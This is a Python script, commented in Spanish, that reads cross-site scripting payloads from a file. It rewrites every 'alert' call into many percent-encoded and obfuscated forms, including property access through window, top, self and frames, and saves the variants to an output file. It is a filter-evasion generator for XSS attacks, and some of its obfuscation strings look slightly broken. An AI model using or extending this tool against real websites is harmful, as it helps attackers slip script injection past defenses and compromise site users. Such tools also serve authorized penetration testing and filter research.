import os
import re
from urllib.parse import quote

def leer_payloads(archivo):
    with open(archivo, 'r', encoding='utf-8') as f:
        return f.read().splitlines()

#def generar_combinaciones_dinamicas():
    # Partes divididas para construcción dinámica de 'alert'
#    letras = {
#        'a': ['a', '%61', '%2561', '\\x61', '3631'],
#      'l': ['l', '%6c', '%2561', '\\x6c', '3663'],
#       'e': ['e', '%65', '%2561', '\\x65', '3635'],
#        'r': ['r', '%72', '%2561', '\\x72', '3732'],
#        't': ['t', '%74', '%2561', '\\x74', '3734'],
#    }

 
def generar_combinaciones_dinamicas():
    # Partes divididas para construcción dinámica de 'alert'
    letras = {
        "a": ["a", "%61", "x61"],
        "l": ["l", "%6c", "x6c"],
        "e": ["e", "%65", "x65"],
        "r": ["r", "%72", "x72"],
        "t": ["t", "%74", "x74"],
    }

    # Combinaciones específicas con inicio y fin
    estructura = {
        "inicio": ["a", "%61", "x61"],
        "fin": ["rt", "%72%74", "x72x74"],
    }
    valores_k = ["e", "%65",]
    objetos = ["top", "window", "self", "this", "frames", "content"]  # Nuevas palabras clave

    combinaciones = []

    # Generar combinaciones completas letra por letra
    for a in letras["a"]:
        for l in letras["l"]:
            for e in letras["e"]:
                for r in letras["r"]:
                    for t in letras["t"]:
                        combinaciones.append(''.join((a, l, e, r, t)))

    # Agregar combinaciones específicas usando inicio, 'k', fin y los nuevos objetos
    for objeto in objetos:  # Iterar sobre los nuevos objetos
        for inicio in estructura["inicio"]:
            for valor_k in valores_k:
                for fin in estructura["fin"]:
                    combinacion_especifica = f";m='{valor_k}'%0A{objeto.lower()}['{inicio}'+k+'{fin}']".replace(' ', '')
                    combinaciones.append(combinacion_especifica.replace(' \\x', '\\x'))

    return combinaciones






# Llamar a la función y asignar el resultado
resultado = generar_combinaciones_dinamicas()

# Puedes imprimir algunas combinaciones para verificar
#for combinacion in resultado[:10]:  # Imprimir solo las primeras 10 para revisión
#    print(combinacion)




def generar_variaciones_alert(payloads, combinaciones):
    variaciones_payloads = []
    for payload in payloads:
        ocurrencias = [m.start(0) for m in re.finditer('alert', payload)]
        if ocurrencias:
            for combinacion in combinaciones:
                variacion = "+".join([quote(part) for part in combinacion])
                nuevo_payload = re.sub('alert', variacion, payload)
                variaciones_payloads.append(nuevo_payload)
        else:
            variaciones_payloads.append(payload)
    return variaciones_payloads

def guardar_variaciones_en_un_archivo(variaciones_payloads, archivo_destino):
    with open(archivo_destino, 'w', encoding='utf-8') as archivo:
        for variacion in variaciones_payloads:
            archivo.write(variacion + "\n")

# Ruta al archivo específico que contiene los payloads
archivo_payload_especifico = "payload.txt"
archivo_salida_modificado = "payloads_modificados.txt"

# Leer payloads específicos del archivo payload.txt
payloads = leer_payloads(archivo_payload_especifico)

# Generar combinaciones dinámicas
combinaciones = generar_combinaciones_dinamicas()

# Aplicar las variaciones a los payloads leídos
variaciones_payloads = generar_variaciones_alert(payloads, combinaciones)

# Guardar todas las variaciones de los payloads en un único archivo
guardar_variaciones_en_un_archivo(variaciones_payloads, archivo_salida_modificado)
